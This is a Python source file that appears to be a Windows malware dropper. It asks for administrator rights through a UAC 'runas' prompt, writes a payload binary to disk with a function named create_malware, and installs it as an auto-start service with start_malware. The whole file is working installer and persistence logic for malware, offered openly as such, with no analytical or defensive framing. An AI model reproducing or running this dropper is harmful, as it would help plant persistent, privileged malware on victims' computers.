from local_libs import payload
from local_libs.env_vars import *
from threading import Thread
import ctypes
import sys
import time
import os


def development_logging():
    log = open("logging.log", "a")
    sys.stderr = log


def is_admin():
    return ctypes.windll.shell32.IsUserAnAdmin()


def run_as_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)


def create_malware(path, binary_code):
    with open(path, "wb") as f:
        f.write(binary_code)


def start_malware():
    os.system(f"{new_binary_path} --startup=auto install")
    os.system(f"{new_binary_path} start")


# def reach_admin_permissions():
#     global started
#     while True:
#         time.sleep(3)
#         if is_admin() == 0:
#             run_as_admin()
#         else:
#             started = True
#             sys.exit(1)
#
#
# started = False

if __name__ == "__main__":
    development_logging()
    # t = Thread(target=reach_admin_permissions, args=())
    # t.start()
    # reach_admin_permissions()

    if is_admin() == 0:
        run_as_admin()

    filename = DEFAULT_MALWARE_FILENAME
    new_path = DEFAULT_MALWARE_PATH
    new_binary_path = f"{new_path}\\{filename}.exe"

    if not os.path.exists(new_path):
        os.mkdir(new_path)
        create_malware(new_binary_path, payload.payload())
    start_malware()

